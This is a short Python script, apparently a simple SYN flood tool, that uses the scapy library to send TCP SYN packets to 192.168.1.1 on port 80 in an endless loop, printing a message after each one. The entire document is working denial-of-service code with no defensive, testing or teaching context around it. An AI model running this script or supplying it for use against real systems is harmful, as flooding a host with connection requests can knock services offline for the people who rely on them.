from scapy.all import IP, TCP, Ether, send



def main():
    target_ip = "192.168.1.1" 
    target_port = 80  

    ip_layer = IP(dst=target_ip)
    tcp_layer = TCP(dport=target_port, flags="S")

    syn_packet = ip_layer / tcp_layer

    while True:
        send(syn_packet, verbose=0)
        print(f"SYN packet was sent to {target_ip}")


if __name__ == "__main__":
    main()

